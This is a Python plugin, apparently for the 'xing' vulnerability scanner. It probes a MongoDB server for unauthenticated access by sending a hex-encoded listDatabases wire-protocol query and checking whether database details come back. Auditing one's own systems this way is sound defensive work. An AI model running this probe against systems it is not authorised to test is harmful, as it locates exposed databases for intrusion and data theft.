from xing.core.BasePlugin import BasePlugin
from xing.core import PluginType, SchemeType


class Plugin(BasePlugin):
    def __init__(self):
        super(Plugin, self).__init__()
        self.plugin_type = PluginType.POC
        self.vul_name = "Mongodb 未授权访问"
        self.app_name = 'Mongodb'
        self.scheme = [SchemeType.MONGODB]

    def verify(self, target):
        client = self.conn_target()
        data = "430000000400000000000000d40700000000000061646d696e2e24636d640000000000ffffffff1c000000016c69737444617461626173657300000000000000f03f00"
        data = bytes.fromhex(data)
        client.send(data)
        recv = client.recv(512)
        self.logger.debug("<<< {}".format(recv))

        client.close()

        if b'sizeOnDisk' in recv and b'Unauthorized' not in recv:
            self.logger.success("发现 Mongodb 未授权访问 {}".format(self.target))
            return True
